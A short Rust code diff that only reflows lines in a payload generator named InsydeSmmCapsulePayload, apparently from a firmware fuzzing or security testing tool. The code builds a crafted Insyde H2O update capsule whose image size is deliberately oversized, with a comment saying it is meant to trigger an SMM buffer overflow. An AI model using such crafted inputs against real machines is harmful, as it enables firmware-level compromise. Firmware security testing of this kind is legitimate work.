@@ -22,8 +22,8 @@ impl Payload for InsydeSmmCapsulePayload {
         let capsule_offset = 0x0;
         // Insyde H2O firmware update capsule GUID
         let insyde_capsule_guid: [u8; 16] = [
-            0x4F, 0x1C, 0x52, 0x31, 0x5F, 0x93, 0xAE, 0x4F,
-            0xB4, 0x11, 0xA2, 0x13, 0xB7, 0x64, 0xFF, 0xE5,
+            0x4F, 0x1C, 0x52, 0x31, 0x5F, 0x93, 0xAE, 0x4F, 0xB4, 0x11, 0xA2, 0x13, 0xB7, 0x64,
+            0xFF, 0xE5,
         ];
         data[capsule_offset..capsule_offset + 16].copy_from_slice(&insyde_capsule_guid);
 
@@ -37,7 +37,8 @@ impl Payload for InsydeSmmCapsulePayload {
 
         // Capsule image size (intentionally oversized to trigger SMM buffer overflow)
         let malicious_size: u32 = 0xFFFF0000;
-        data[capsule_offset + 24..capsule_offset + 28].copy_from_slice(&malicious_size.to_le_bytes());
+        data[capsule_offset + 24..capsule_offset + 28]
+            .copy_from_slice(&malicious_size.to_le_bytes());
 
         // Insyde H2O IHISI (Insyde H2O Software Interface) SMM handler marker
         let ihisi_offset = 0x100;
